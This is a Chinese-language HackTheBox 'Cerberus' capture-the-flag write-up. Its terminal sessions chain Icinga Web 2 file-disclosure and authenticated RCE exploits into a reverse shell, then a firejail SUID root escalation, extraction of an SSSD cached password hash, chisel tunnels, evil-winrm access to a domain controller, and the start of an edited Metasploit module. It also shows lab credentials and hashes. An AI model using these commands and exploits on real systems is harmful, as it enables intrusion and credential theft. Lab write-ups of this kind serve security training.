---
title: HTB-Cerberus Writeup
date: 2026-11-04T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
  - Windows
  - Linux
  - Icinga
  - Firejail
  - Metasploit
---
## Nmap 探索

使用 nmap 扫描存活的 tcp 端口，只有 8080。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ sudo nmap --min-rate 10000 -p- 10.129.232.100 -oA Nmap/ports
Starting Nmap 7.98 ( https://nmap.org ) at 2026-11-03 05:30 -0500
Nmap scan report for 10.129.232.100
Host is up (0.73s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 18.63 seconds
```

## Web 渗透

访问 8080 端口，自动跳转至 icinga.cerberus.local，解析 DNS。

![](Pasted%20image%2020261103150748.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ tail -n 1 /etc/hosts
10.129.232.100 icinga.cerberus.local
```

重新访问出现界面，十一和名为 icinga 的系统。

![](Pasted%20image%2020261103151113.png)

用 searchsploit 搜索这个系统的公开漏洞，暴露出来了三个，其中两个是有价值的：一个是路径穿越，一个是认证后的代码执行。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ searchsploit Icinga
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Icinga - cgi/config.c process_cgivars Function Off-by-One Read Remote Denial of Service                                               | cgi/dos/38882.txt
Icinga Web 2.10 - Arbitrary File Disclosure                                                                                           | php/webapps/51329.py
Icinga Web 2.10 - Authenticated Remote Code Execution                                                                                 | php/webapps/51586.py
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

将路径穿越的执行脚本拉取到工作目录。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ searchsploit -m 51329
  Exploit: Icinga Web 2.10 - Arbitrary File Disclosure
      URL: https://www.exploit-db.com/exploits/51329
     Path: /usr/share/exploitdb/exploits/php/webapps/51329.py
    Codes: CVE-2022-24716
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/Work/Kali/Cerberus/51329.py
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ ls -liah
total 16K
3552883 drwxrwxr-x  3 kali kali 4.0K Nov  3 05:44 .
2759041 drwxrwxr-x 23 kali kali 4.0K Nov  3 05:29 ..
3553025 -rwxr-xr-x  1 kali kali 2.4K Nov  3 05:44 51329.py
3552816 drwxrwxr-x  2 kali kali 4.0K Nov  3 05:31 Nmap
```

### 路径穿越

用脚本查看 `/etc/passwd` 成功，但是没发现有价值的信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ python3 51329.py http://icinga.cerberus.local:8080/icingaweb2/ /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
matthew:x:1000:1000:matthew:/home/matthew:/bin/bash
ntp:x:108:113::/nonexistent:/usr/sbin/nologin
sssd:x:109:115:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
nagios:x:110:118::/var/lib/nagios:/usr/sbin/nologin
redis:x:111:119::/var/lib/redis:/usr/sbin/nologin
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
icingadb:x:999:999::/etc/icingadb:/sbin/nologin
```

尝试查看 `/etc/shadow`，没有结果。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ python3 51329.py http://icinga.cerberus.local:8080/icingaweb2/ /etc/shadow
```

查看 `/etc/icingaweb2/authentication.ini` 文件，认证后端是 `db`，账号信息和 hash 都放在 MySQL 里，而不是本地文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ python3 51329.py http://icinga.cerberus.local:8080/icingaweb2/ /etc/icingaweb2/authentication.ini
[icingaweb2]
backend = "db"
resource = "icingaweb2"
```

`matthew` 属于Administrator，权限是 `*`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ python3 51329.py http://icinga.cerberus.local:8080/icingaweb2/ /etc/icingaweb2/roles.ini
[Administrators]
users = "matthew"
permissions = "*"
groups = "Administrators"
unrestricted = "1"
```

继续查看 `/etc/icingaweb2/resources.ini`，发现明文密码 `IcingaWebPassword2023`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ python3 51329.py http://icinga.cerberus.local:8080/icingaweb2/ /etc/icingaweb2/resources.ini
[icingaweb2]
type = "db"
db = "mysql"
host = "localhost"
dbname = "icingaweb2"
username = "matthew"
password = "IcingaWebPassword2023"
use_ssl = "0"
```

`config.ini` 没有暴露出来更多信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ python3 51329.py http://icinga.cerberus.local:8080/icingaweb2/ /etc/icingaweb2/config.ini
[global]
show_stacktraces = "1"
show_application_state_messages = "1"
config_backend = "db"
config_resource = "icingaweb2"
module_path = "/usr/share/icingaweb2/modules/"

[logging]
log = "syslog"
level = "ERROR"
application = "icingaweb2"
facility = "user"

[themes]

[authentication]
```

将收集到的凭据保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus/Users]
└─$ cat matthew
matthew:IcingaWebPassword2023
```

登录得到 matthew。

![](Pasted%20image%2020261103153157.png)

浏览发现这个账号是 Administrator。

![](Pasted%20image%2020261103153341.png)

### 代码执行

将代码执行的恶意脚本拉取到本地，查看用法。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ searchsploit -m 51586
  Exploit: Icinga Web 2.10 - Authenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/51586
     Path: /usr/share/exploitdb/exploits/php/webapps/51586.py
    Codes: CVE-2022-24715
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/kali/Work/Kali/Cerberus/51586.py
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ python3 51586.py -h
usage: 51586.py [-h] -u URL -U USER -P PASSWORD -i IP -p PORT

Descripción de tu programa.

options:
  -h, --help            show this help message and exit
  -u, --url URL         Insertar la URL http://ip_victima
  -U, --user USER       Insertar usuario -U user
  -P, --password PASSWORD
                        Insertar contraseña -P password
  -i, --ip IP           Insertar IP de atacante -i IP
  -p, --port PORT       Insertar puerto de atacante -p PORT
```

根据用法给出命令，回连 Kali 的 4444 端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ python3 51586.py -u http://icinga.cerberus.local:8080 -U matthew -P IcingaWebPassword2023 -i 10.10.16.151 -p 4444
[*]Session successfully.
[*]File uploaded successfully.
[*]Eliminating evidence
```

同时 Kali 监听 4444 端口，等待回连拿到 www-data 的 bash 环境。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ sudo rlwrap -cAr nc -lvnp 4444                              
[sudo] password for kali: 
listening on [any] 4444 ...
connect to [10.10.16.151] from (UNKNOWN) [10.129.232.100] 49858
bash: cannot set terminal process group (628): Inappropriate ioctl for device
bash: no job control in this shell
www-data@icinga:/usr/share/icingaweb2/public$ whoami
whoami
www-data

```

## 提权至 root

看看本机在监听什么，3306 和 6379 都绑定在回环上，外部碰不到。

```bash
www-data@icinga:/usr/share/icingaweb2/public$ ss -tlnp
ss -tlnp
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*          
LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*          
LISTEN 0      511        127.0.0.1:6379      0.0.0.0:*          
LISTEN 0      511            [::1]:6379         [::]:*          
LISTEN 0      511                *:80              *:* 
```

使用之前找到的 mysql 账号查询表。

```bash
www-data@icinga:/usr/share/icingaweb2/public$ mysql -u matthew -p'IcingaWebPassword2023' -h 127.0.0.1 icingaweb2 -e "show tables;"
<word2023' -h 127.0.0.1 icingaweb2 -e "show tables;"
+----------------------------+
| Tables_in_icingaweb2       |
+----------------------------+
| icingaweb_group            |
| icingaweb_group_membership |
| icingaweb_rememberme       |
| icingaweb_user             |
| icingaweb_user_preference  |
+----------------------------+
```

查询权限，权限很干净。

```bash
www-data@icinga:/usr/share/icingaweb2/public$ mysql -u matthew -p'IcingaWebPassword2023' -h 127.0.0.1 -e "show grants;"
<ingaWebPassword2023' -h 127.0.0.1 -e "show grants;"
+----------------------------------------------------------------------------------------------------------------+
| Grants for matthew@localhost                                                                                   |
+----------------------------------------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO `matthew`@`localhost` IDENTIFIED BY PASSWORD '*48BBE5BAD61013B6B03BE9043BDF711D6D67ED3F' |
| GRANT ALL PRIVILEGES ON `icingaweb2`.* TO `matthew`@`localhost`                                                |
+----------------------------------------------------------------------------------------------------------------+

```

查表的细节，查询到了 hash，但是已经有了明文密码了，这个信息没什么用。

```bash
www-data@icinga:/usr/share/icingaweb2/public$ mysql -u matthew -p'IcingaWebPassword2023' -h 127.0.0.1 icingaweb2 -e "select * from icingaweb_user;"
<0.0.1 icingaweb2 -e "select * from icingaweb_user;"
+---------+--------+--------------------------------------------------------------+---------------------+-------+
| name    | active | password_hash                                                | ctime               | mtime |
+---------+--------+--------------------------------------------------------------+---------------------+-------+
| matthew |      1 | $2y$10$XL4/y9uLpQqGA5lB0PTxreAnounQo.OR39REJIZ8NB/D6Xn4KQpVu | 2023-01-26 15:20:37 | NULL  |
+---------+--------+--------------------------------------------------------------+---------------------+-------+

```

查看具有 sid 的可执行文件，发现一个易受攻击的组件 firejail。

```bash
www-data@icinga:/usr/share/icingaweb2/public$ find / -perm -u=s -type f 2>/dev/null
<aweb2/public$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/ccreds_chkpwd
/usr/bin/mount
/usr/bin/sudo
/usr/bin/firejail
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/ksu
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1

```

下载提权脚本到 Kali 工作目录。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus/payload]
└─$ curl -sSL https://gist.githubusercontent.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25/raw -o fj.py
┌──(kali㉿kali)-[~/Work/Kali/Cerberus/payload]
└─$ ls
fj.py
┌──(kali㉿kali)-[~/Work/Kali/Cerberus/payload]
└─$ file fj.py
fj.py: Python script, ASCII text executable
```

复制到 www-data。
```bash
ww-data@icinga:/tmp/apps$ curl -o /tmp/apps/fj.py http://10.10.16.151:80/fj.py
<url -o /tmp/apps/fj.py http://10.10.16.151:80/fj.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7954    0  7954    0     0  28925      0 --:--:-- --:--:-- --:--:-- 29029
www-data@icinga:/tmp/apps$ ls -liah
ls -liah
total 16K
16461 drwxr-xr-x  2 www-data www-data 4.0K Nov  4 01:54 .
   20 drwxrwxrwt 13 root     root     4.0K Nov  4 01:53 ..
 1146 -rw-r--r--  1 www-data www-data 7.8K Nov  4 01:54 fj.py
```

```bash
www-data@icinga:/tmp/apps$ ls -liah
ls -liah
total 16K
16461 drwxr-xr-x  2 www-data www-data 4.0K Nov  4 01:54 .
   20 drwxrwxrwt 13 root     root     4.0K Nov  4 01:53 ..
 1146 -rwxr-xr-x  1 www-data www-data 7.8K Nov  4 01:54 fj.py

```

后台跑起来，并用一根永远不会关闭的输入管道吊住标准输出。

```bash
www-data@icinga:/tmp/apps$ tail -f /dev/null | python3 /tmp/apps/fj.py > /tmp/apps/fj.out 2>&1 &
<| python3 /tmp/apps/fj.py > /tmp/apps/fj.out 2>&1 &
[1] 1254

```

读取 `fj.out`，它告诉我们下一步应该执行什么。

```bash
www-data@icinga:/tmp/apps$ cat fj.out
cat fj.out
You can now run 'firejail --join=1774' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

执行获得 root 权限。

```bash
www-data@icinga:/tmp/apps$ firejail --join=1774
firejail --join=1774
changing root to /proc/1774/root
Warning: cleaning all supplementary groups
Child process initialized in 6.59 ms
www-data@icinga:/tmp/apps$ su -
su -
root@icinga:~# whoami
whoami
root

```

查看 ip，虚拟网卡 MAC 的前缀 `00:15:5d` 指向 Hyper-V，说明这是一台虚拟机

```bash
root@icinga:~# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:5f:e8:01 brd ff:ff:ff:ff:ff:ff
    inet 172.16.22.2/28 brd 172.16.22.15 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::215:5dff:fe5f:e801/64 scope link 
       valid_lft forever preferred_lft forever
```

## 提权至 matthew

查看进程，出现了 sssd，且参数是 `--domain cerberus.local`，说明这台机器加入了域。

```bash
root@icinga:~# ps auxww | grep -i sssd
ps auxww | grep -i sssd
root         551  0.0  1.3  93916 12420 ?        Ss   01:41   0:00 /usr/sbin/sssd -i --logger=files
root         845  0.0  1.7  98216 15276 ?        S    01:41   0:00 /usr/libexec/sssd/sssd_be --domain cerberus.local --uid 0 --gid 0 --logger=files
root         964  0.0  1.7 109128 15412 ?        S    01:41   0:00 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root         965  0.0  1.5  83340 13628 ?        S    01:41   0:00 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
root        1874  0.0  0.1   3468  1552 pts/0    S+   02:26   0:00 grep --color=auto -i sssd
```

SSSD 的数据目录是按照域名命名的 ldb 文件，域用户缓存就在其中。

```bash
root@icinga:~# ls -la /var/lib/sss/db/
ls -la /var/lib/sss/db/
total 5036
drwx------  2 root root    4096 Mar  2  2023 .
drwxr-xr-x 10 root root    4096 Jan 22  2023 ..
-rw-r--r--  1 root root 1286144 Nov  4 01:41 cache_cerberus.local.ldb
-rw-------  1 root root    2715 Mar  2  2023 ccache_CERBERUS.LOCAL
-rw-------  1 root root 1286144 Nov  4 01:41 config.ldb
-rw-------  1 root root 1286144 Jan 22  2023 sssd.ldb
-rw-r--r--  1 root root 1286144 Mar  1  2023 timestamps_cerberus.local.ldb

```

缓存中发现了 `matthew` 的 sha512crypt hash。

```bash
root@icinga:~# strings /var/lib/sss/db/cache_cerberus.local.ldb | grep -B6 -A3 -i cachedPassword                                     
<cerberus.local.ldb | grep -B6 -A3 -i cachedPassword                                                                                 
isPosix                                                                                                                              
TRUE                                                                                                                                 
lastUpdate                                                                                                                           
1677672476                                                                                                                           
dataExpireTimestamp                                                                                                                  
initgrExpireTimestamp                                                                                                                
cachedPassword                                                                                                                       
$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0                           
cachedPasswordType                                                                                                                   
lastCachedPasswordChange                                                                                                             
1677672476                                                                                                                           
failedLoginAttempts                                                                                                                  
aExpireTimestamp 
isPosix                                                                                                                              
TRUE
lastUpdate
1677672476
dataExpireTimestamp
initgrExpireTimestamp
cachedPassword
$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
cachedPasswordType
lastCachedPasswordChange
1677672476
failedLoginAttempts
aExpireTimestamp
--
isPosix
TRUE
lastUpdate
1677672476
dataExpireTimestamp
initgrExpireTimestamp
cachedPassword
$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
cachedPasswordType
lastCachedPasswordChange
1677672476
failedLoginAttempts
aExpireTimestamp
```

再次确认网段。

```bash
root@icinga:~# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:5f:e8:01 brd ff:ff:ff:ff:ff:ff
    inet 172.16.22.2/28 brd 172.16.22.15 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::215:5dff:fe5f:e801/64 scope link 
       valid_lft forever preferred_lft forever

```

宿主机的 5985 是存活的。

```bash
root@icinga:~# timeout 3 bash -c 'echo > /dev/tcp/172.16.22.1/5985' && echo WINRM_OPEN
<cho > /dev/tcp/172.16.22.1/5985' && echo WINRM_OPEN
WINRM_OPEN

```

准备好 chisel

```bash
root@icinga:/tmp/apps# ls -liah chisel
ls -liah chisel
1674 -rwxr-xr-x 1 root root 11M Mar 26  2026 chisel

```

用 chisel 起客户端，把宿主的 WinRM 端口映射至 Kali 本地。

```bash
root@icinga:/tmp/apps# /tmp/apps/chisel client 10.10.16.151:8000 R:5985:172.16.22.1:5985
<el client 10.10.16.151:8000 R:5985:172.16.22.1:5985
2026/11/04 02:39:25 client: Connecting to ws://10.10.16.151:8000
2026/11/04 02:39:27 client: Connected (Latency 261.5021ms)
```

在 Kali 侧开服务端并启动反向隧道。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ chisel server -p 8000 --reverse
2026/11/03 21:37:23 server: Reverse tunnelling enabled
2026/11/03 21:37:23 server: Fingerprint YK/t+mIbfh9OlYWVhd+YQ+7/5nxqAjAFtUJsWCJPLCA=
2026/11/03 21:37:23 server: Listening on http://0.0.0.0:8000
2026/11/03 21:40:46 server: session#1: tun: proxy#R:5985=>172.16.22.1:5985: Listening
```

使用 evil-winrm 登录得到 matthew。

```bash
┌──(kali㉿kali)-[/usr/bin]
└─$ evil-winrm -i 127.0.0.1 -u matthew -p 147258369
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\matthew\Documents> whoami
cerberus\matthew
```

## 提权至 Administrator

本机账号列表只有四个。

```bash
*Evil-WinRM* PS C:\Users\matthew\Desktop> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt
matthew
The command completed with one or more errors.

```

查看完整的账号权限。

```bash
*Evil-WinRM* PS C:\Users\matthew\Desktop> whoami /all                                                                                
                                                                                                                                     
                                                                                                                                     
USER INFORMATION                                                                                                                     
----------------                                                                                                                     
                                                                                                                                     
User Name        SID                                                                                                                 
================ ==============================================                                                                      
cerberus\matthew S-1-5-21-4088429403-1159899800-2753317549-1104                                                                      
                                                                                                                                     
                                                                                                                                     
GROUP INFORMATION                                                                                                                    
-----------------                                                                                                                    
                                                                                                                                     
Group Name                                  Type             SID          Attributes                                                 
=========================================== ================ ============ ==================================================         
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group         
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group         
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group         
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group         
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group         
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group         
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group         
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group         
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group         
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```

查看已启用的进程。

```bash
Evil-WinRM* PS C:\Users\matthew\Desktop> netstat -ano | findstr LISTEN                                                              
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4                                                             
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       700                                                           
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       952                                                           
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       700                                                           
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4                                                             
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4                                                             
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       700                                                           
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       952                                                           
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       700                                                           
  TCP    0.0.0.0:808            0.0.0.0:0              LISTENING       1724                                                          
  TCP    0.0.0.0:1500           0.0.0.0:0              LISTENING       1724                                                          
  TCP    0.0.0.0:1501           0.0.0.0:0              LISTENING       1724                                                          
  TCP    0.0.0.0:2179           0.0.0.0:0              LISTENING       3248                                                          
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       700                                                           
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       700                                                           
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4                                                             
  TCP    0.0.0.0:8888           0.0.0.0:0              LISTENING       4192                                                          
  TCP    0.0.0.0:9251           0.0.0.0:0              LISTENING       4192                                                          
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2560
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       532
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1232
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1728
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       700                                                           
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:49907          0.0.0.0:0              LISTENING       672
  TCP    0.0.0.0:49911          0.0.0.0:0              LISTENING       724
  TCP    0.0.0.0:53671          0.0.0.0:0              LISTENING       2720
  TCP    0.0.0.0:61155          0.0.0.0:0              LISTENING       2164
  TCP    10.129.232.100:53      0.0.0.0:0              LISTENING       724
  TCP    10.129.232.100:139     0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       724
  TCP    127.0.0.1:32000        0.0.0.0:0              LISTENING       2456
  TCP    127.0.0.1:33308        0.0.0.0:0              LISTENING       2292
  TCP    127.0.0.1:49894        0.0.0.0:0              LISTENING       4192
  TCP    172.16.22.1:53         0.0.0.0:0              LISTENING       724
  TCP    172.16.22.1:139        0.0.0.0:0              LISTENING       4
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:88                [::]:0                 LISTENING       700
  TCP    [::]:135               [::]:0                 LISTENING       952
  TCP    [::]:389               [::]:0                 LISTENING       700
  TCP    [::]:443               [::]:0                 LISTENING       4
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       700
  TCP    [::]:593               [::]:0                 LISTENING       952
  TCP    [::]:636               [::]:0                 LISTENING       700
    TCP    [::]:808               [::]:0                 LISTENING       1724
  TCP    [::]:1500              [::]:0                 LISTENING       1724
  TCP    [::]:1501              [::]:0                 LISTENING       1724
  TCP    [::]:2179              [::]:0                 LISTENING       3248
  TCP    [::]:3268              [::]:0                 LISTENING       700
  TCP    [::]:3269              [::]:0                 LISTENING       700
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       2560
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       532
  TCP    [::]:49665             [::]:0                 LISTENING       1232
  TCP    [::]:49666             [::]:0                 LISTENING       1728
  TCP    [::]:49667             [::]:0                 LISTENING       700
  TCP    [::]:49673             [::]:0                 LISTENING       700
  TCP    [::]:49674             [::]:0                 LISTENING       700
  TCP    [::]:49678             [::]:0                 LISTENING       700
  TCP    [::]:49907             [::]:0                 LISTENING       672
  TCP    [::]:49911             [::]:0                 LISTENING       724
  TCP    [::]:53671             [::]:0                 LISTENING       2720
  TCP    [::]:61155             [::]:0                 LISTENING       2164
  TCP    [::1]:53               [::]:0                 LISTENING       724
  TCP    [::1]:33308            [::]:0                 LISTENING       2292
  TCP    [dead:beef::174]:53    [::]:0                 LISTENING       724
  TCP    [dead:beef::e5aa:ae97:590c:395a]:53  [::]:0                 LISTENING       724
  TCP    [fe80::48af:2355:a041:da88%5]:53  [::]:0                 LISTENING       724
  TCP    [fe80::e225:edaa:5112:dfc3%6]:53  [::]:0                 LISTENING       724
```

准备好 windows 版的 chisel。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ ls -liah ../../Tools/chisel/chisel.exe
3553151 -rw-r--r-- 1 kali root 8.3M Nov  3 22:40 ../../Tools/chisel/chisel.exe
```

上传至 matthew。

```bash
*Evil-WinRM* PS C:\Users\matthew> dir c.exe


    Directory: C:\Users\matthew


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/3/2026   7:40 PM        8676864 c.exe

```

宿主的防火墙只对 icinga 放行 5985，所以隧道必须有 DC 自己发起、目标写成 `127.0.0.1`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ nxc winrm 127.0.0.1 -u matthew -p '147258369' -x "C:\Users\matthew\c.exe client 10.10.16.151:8000 R:9251:127.0.0.1:9251"
WINRM       127.0.0.1       5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:cerberus.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       127.0.0.1       5985   DC               [+] cerberus.local\matthew:147258369 (Pwn3d!)
WINRM       127.0.0.1       5985   DC               [-] Execute command failed, current user: 'cerberus.local\matthew' has no 'Invoke' rights to execute command (shell type: cmd)

```

将 msf 的模块复制下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ cp /usr/share/metasploit-framework/modules/exploits/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966.rb ~/.msf4/modules/exploits/multi/http/adssp_saml_v2.rb
┌──(kali㉿kali)-[~/Work/Kali/Cerberus]
└─$ vim ~/.msf4/modules/exploits/multi/http/adssp_saml_v2.rb
```

做一些改动。

```bash
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
